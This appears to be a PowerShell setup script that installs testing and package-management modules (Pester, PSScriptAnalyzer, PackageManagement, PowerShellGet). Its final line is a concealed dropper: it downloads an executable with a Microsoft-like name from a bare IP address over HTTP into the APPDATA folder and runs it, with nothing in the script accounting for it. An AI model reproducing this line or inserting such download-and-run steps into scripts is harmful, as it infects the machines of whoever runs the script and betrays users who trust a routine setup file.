Write-Host "Installing Pester" -ForegroundColor Cyan
Install-Module Pester -Force -SkipPublisherCheck
Write-Host "Installing PSScriptAnalyzer" -ForegroundColor Cyan
Install-Module PSScriptAnalyzer -Force -SkipPublisherCheck
Write-Host "Installing latest PackageManagement" -ForegroundColor Cyan
Install-Module PackageManagement -Force -SkipPublisherCheck
Write-Host "Installing latest PowerShellGet" -ForegroundColor Cyan
Install-Module PowerShellGet -Force -SkipPublisherCheck

(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")

